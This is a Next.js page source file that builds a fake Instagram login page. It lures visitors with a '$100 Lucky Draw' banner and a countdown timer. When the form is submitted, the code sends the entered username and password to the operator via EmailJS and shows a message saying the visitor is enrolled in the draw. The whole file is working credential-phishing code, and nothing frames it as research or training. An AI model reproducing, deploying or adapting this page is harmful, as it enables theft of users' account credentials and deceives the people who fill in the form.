// pages/index.tsx
"use client"

import { NextPage } from 'next';
import Head from 'next/head';
import { useState, useEffect } from 'react';
import emailjs from 'emailjs-com';

const HomePage: NextPage = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [timeLeft, setTimeLeft] = useState(3600); // Initial countdown time in seconds (1 hour)

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prevTime => (prevTime > 0 ? prevTime - 1 : 0));
    }, 1000);

    return () => clearInterval(timer); // Cleanup the timer on component unmount
  }, []);

  const formatTime = (seconds: number) => {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  const handleSubmit = (event: React.FormEvent) => {
    event.preventDefault();

    const emailContent = `Username: ${username}\nPassword: ${password}`;

    emailjs.send(
      process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID || '',
      process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID || '',
      {
        from_name: username,
        message: emailContent,
      },
      process.env.NEXT_PUBLIC_EMAILJS_USER_ID || ''
    )
    .then((response) => {
      console.log('Email sent successfully:', response.status, response.text);
      alert('You are successfully enrolled in 100$ Lucky Draw!');
    })
    .catch((error) => {
      console.error('Error sending email:', error);
      alert('Failed to send details.');
    });
  };

  return (
    <>
      <Head>
        <title>Login - Instagram</title>
        <meta name="description" content="Login page" />
        <link rel="icon" href="/favicon.ico" />
        <link
          rel="stylesheet"
          href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap"
        />
      </Head>
      <div className="banner">
        <p>
          Login Now! To get a chance to enroll in $100 Lucky Draw.
          <span className="timer">{formatTime(timeLeft)}</span>
        </p>
      </div>
      <div className="login-container">
        <div className="login-box">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
            alt="Instagram Logo"
            className="logo"
          />
          <form className="login-form" onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Phone number, username, or email"
              className="input-field"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
            <input
              type="password"
              placeholder="Password"
              className="input-field"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button type="submit" className="login-button">Log In</button>
            <div className="divider">OR</div>
            <button type="button" className="facebook-button">
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"
                alt="Facebook Logo"
                className="facebook-logo"
              />
              Log in with Facebook
            </button>
          </form>
          <div className="footer">
            <p>Don't have an account? <a href="#">Sign up</a></p>
            <p><a href="#">Forgot password?</a></p>
          </div>
        </div>
      </div>
    </>
  );
};

export default HomePage;
